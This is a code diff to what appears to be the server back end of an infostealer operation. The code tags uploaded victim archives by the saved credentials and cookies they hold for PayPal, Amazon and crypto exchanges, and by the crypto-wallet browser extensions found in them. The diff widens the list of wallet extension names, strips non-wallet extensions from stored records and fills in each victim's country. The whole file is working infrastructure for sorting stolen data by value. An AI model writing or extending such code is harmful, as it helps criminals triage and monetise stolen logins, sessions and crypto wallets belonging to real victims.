@@ -193,6 +193,19 @@ const EXCHANGE_NEEDLES = [
 /// PayPal/Amazon badges fire on saved credentials OR cookies for the domain.
 /// Exchange badges fire on either too (a live session is valuable on its own).
 /// Wallets come from Info.json lists.
+// Extension vaults only count for actual crypto wallets — 2FA/password-manager
+// extensions (Authenticator, Bitwarden, etc.) are NOT wallets. Includes both
+// the short names the DLL emits and the long variants seen in older archives.
+const KNOWN_EXT_WALLETS = new Set([
+  "MetaMask", "Phantom", "Coinbase Wallet", "Trust Wallet", "Rabby", "OKX Wallet",
+  "Bybit", "Bybit Wallet", "Binance Wallet", "Crypto.com Onchain", "Bitget Wallet",
+  "BitKeep", "Exodus", "Guarda", "Guarda Wallet", "Ctrl Wallet", "Enkrypt",
+  "SafePal", "Solflare", "Backpack", "Zerion", "Keplr", "Leap", "Leap Wallet",
+  "Cosmostation", "Station", "Station Wallet", "Petra", "Martian", "Slush",
+  "Suiet", "TronLink", "Leather", "Rainbow", "Coin98", "Uniswap", "TokenPocket",
+  "MathWallet", "Core", "Ready Wallet", "Braavos", "MyTonWallet", "Ronin",
+  "Ronin Wallet", "Frontier", "Frontier Wallet",
+]);
 function computeTags(zipBuf, info) {
   const tags = new Set();
   const exchanges = [];
@@ -236,17 +249,6 @@ function computeTags(zipBuf, info) {
     }
   } catch {}
   if (Array.isArray(info?.DesktopWallets) && info.DesktopWallets.length > 0) tags.add("crypto-wallet");
-  // Extension vaults only count for actual crypto wallets — 2FA/password-manager
-  // extensions (Authenticator, Bitwarden, etc.) are NOT wallets.
-  const KNOWN_EXT_WALLETS = new Set([
-    "MetaMask", "Phantom", "Coinbase Wallet", "Trust Wallet", "Rabby", "OKX Wallet",
-    "Bybit Wallet", "Binance Wallet", "Crypto.com Onchain", "Bitget Wallet", "Exodus",
-    "Guarda Wallet", "Ctrl Wallet", "Enkrypt", "SafePal", "Solflare", "Backpack",
-    "Zerion", "Keplr", "Leap Wallet", "Cosmostation", "Station Wallet", "Petra",
-    "Martian", "Slush", "Suiet", "TronLink", "Leather", "Rainbow", "Coin98",
-    "Uniswap", "TokenPocket", "MathWallet", "Core", "Ready Wallet", "Braavos",
-    "MyTonWallet", "Ronin Wallet", "BitKeep", "Frontier Wallet",
-  ]);
   if (
     Array.isArray(info?.BrowserExtensions) &&
     info.BrowserExtensions.some((e) => typeof e === "string" && KNOWN_EXT_WALLETS.has(e))
@@ -1124,12 +1126,27 @@ export default {
           } catch {}
           const { tags, exchanges } = computeTags(zip.buf, info);
           let infoJson = row.info_json;
-          if (info && typeof info === "object" && !info.Country) {
-            const c = clientCountry(row.client_id);
-            if (c) {
-              info.Country = c;
-              infoJson = JSON.stringify(info);
+          if (info && typeof info === "object") {
+            let dirty = false;
+            if (!info.Country) {
+              const c = clientCountry(row.client_id);
+              if (c) {
+                info.Country = c;
+                dirty = true;
+              }
             }
+            // The Wallets column merges DesktopWallets + BrowserExtensions, so
+            // drop any non-wallet extensions the old DLL enumerated.
+            if (Array.isArray(info.BrowserExtensions)) {
+              const walletsOnly = info.BrowserExtensions.filter(
+                (e) => typeof e === "string" && KNOWN_EXT_WALLETS.has(e)
+              );
+              if (walletsOnly.length !== info.BrowserExtensions.length) {
+                info.BrowserExtensions = walletsOnly;
+                dirty = true;
+              }
+            }
+            if (dirty) infoJson = JSON.stringify(info);
           }
           ctx.db.prepare("UPDATE archives SET tags = ?, exchanges = ?, info_json = ? WHERE id = ?").run(JSON.stringify(tags), JSON.stringify(exchanges), infoJson, row.id);
           updated++;
